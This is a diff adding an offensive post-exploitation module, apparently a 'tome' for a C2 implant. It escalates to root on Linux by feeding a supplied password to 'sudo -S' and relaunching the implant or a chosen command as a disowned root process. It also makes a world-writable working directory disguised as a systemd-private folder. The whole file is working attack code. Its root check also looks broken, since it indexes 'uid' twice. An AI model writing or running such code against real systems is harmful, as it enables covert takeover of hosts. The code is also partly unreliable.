@@ -1,0 +1,71 @@
+MODNAME="[LPE-SUDO]"
+DEBUG=False # Dont disown
+
+# Create a temp dir that is shared across all the rake tomes
+def get_tmp_dir():
+    system_id_file = "/var/tmp/system-id" # SHOULD match imix
+    mach = ""
+    if file.exists(system_id_file):
+        mach = file.read(system_id_file).strip()
+    
+    if not mach:
+        mach = random.string(32, "abcdef0123456789")
+        file.write(system_id_file, mach)
+    
+    path = f"/tmp/systemd-private-{mach}-systemd.service-aGF4eA/tmp"
+    if not file.exists(path):
+        sys.shell(f"mkdir -p {path} && chmod 777 {path}")
+    
+    return path
+
+def try_sudo(args, password):
+    """Try to get root using sudo"""
+    res = sys.exec("sudo", ["-Sl"], False, input=password)
+    # Password is required and we dont have one
+    err = res.get("stderr", "") 
+    if "incorrect password attempt" in err or "a password is required" in err:
+        if not password:
+            print(MODNAME, "[ERROR] sudo password is required and none given")
+            return -1
+    # Report the sudo output
+    # TODO more than just dump a string here, json? format it properly?
+    # TODO GTFOBins, we might actually not be allowed to run arbitrary commands here...
+    stdout = res.get("stdout", "").strip()
+    if stdout:
+        print(MODNAME, "SUDO PERMISSIONS:\n" + stdout)
+
+    if password and not password.endswith("\n"):
+        password = password + "\n"
+    res = sys.exec("sudo", ["-S", "id"], False, input=password)
+    if "0(root)" not in res.get("stdout", ""):
+        print(f"{MODNAME} [WARN] failed to run 'sudo -S id' with password: {res}")
+        return -1
+    res = sys.exec("sudo", ["-S"] + args, not DEBUG, input=password)
+    argstr = " ".join(args)
+    print(MODNAME, f"Launched as root with sudo -S {argstr}. disowned")
+    if DEBUG:
+        print(args, res)
+    return 0
+
+def main():
+    # If a cmd is passed in the args, use that, else we just call ourself
+    exe = input_params.get("pivot_cmd", "")
+    if not exe:
+        exe = process.info()["exe"]
+
+
+    if not sys.is_linux():
+        print("[ERROR] This script is only for Linux")
+        return -1
+
+    am_i_root = sys.get_user()['uid']
+    if am_i_root['uid'] == 0:
+        print(f"[ERROR] uid is 0. no need to try and root box: Aborting.")
+        return -1
+
+    # TODO setup a pivot here?
+    password = input_params.get("password", "").strip() # Can be blank, will just try a passwordless sudo
+    print(MODNAME, "trying sudo with", password, exe)
+    try_sudo([exe], password=password)
+
+main()
